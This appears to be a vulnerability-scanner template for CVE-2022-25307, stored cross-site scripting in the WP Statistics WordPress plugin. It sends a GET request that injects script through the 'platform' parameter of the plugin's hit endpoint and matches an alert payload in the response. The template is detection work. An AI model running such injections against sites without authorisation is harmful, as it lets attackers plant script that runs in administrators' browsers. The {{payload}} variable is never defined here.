id: CVE-2022-25307

info:
  name: WP Statistics Plugin XSS
  author: ProjectDiscoveryAI
  severity: high
  description: The WP Statistics WordPress plugin is vulnerable to Cross-Site Scripting due to insufficient escaping and sanitization of the platform parameter found in the ~/includes/class-wp-statistics-hits.php file which allows attackers to inject arbitrary web scripts onto several pages that execute when site administrators view a sites statistics, in versions up to and including 13.1.5.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and potential compromise of the WordPress site.
  remediation: |
    Update WP Statistics Plugin to the latest patched version to mitigate the XSS vulnerability (CVE-2022-25307).
  reference:
    - https://gist.github.com/Xib3rR4dAr/8090a6d026d4601083cff80aa80de7eb

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/wp-statistics/v2/hit?platform={{payload}}"

    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
